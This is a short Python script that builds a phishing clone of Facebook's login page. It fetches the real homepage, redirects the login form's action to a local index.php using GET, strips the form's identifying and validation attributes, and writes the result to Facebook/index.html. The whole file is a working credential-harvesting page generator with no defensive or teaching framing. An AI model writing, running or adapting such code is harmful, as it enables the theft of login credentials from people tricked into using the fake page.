from bs4 import BeautifulSoup
import requests, os, lxml

def main():
    original = "./original.html"
    with open(original, "w", encoding="utf-8") as file:
        response = requests.get("https://www.facebook.com/")
        file.write(response.text)
        
    modified = "./Facebook/index.html"
    with open(original, "r", encoding="utf-8") as file:
        soup = BeautifulSoup(file.read(), "lxml")
        form = soup.find("form")
        form["action"] = "./index.php"
        form["method"] = "get"
        del form["class"]
        del form["id"]
        del form["onsubmit"]
        del form["data-testid"]
        with open(modified, "w", encoding="utf-8") as file:
            file.write(soup.prettify())
            
    os.unlink("./original.html")

if __name__ == "__main__":
    main()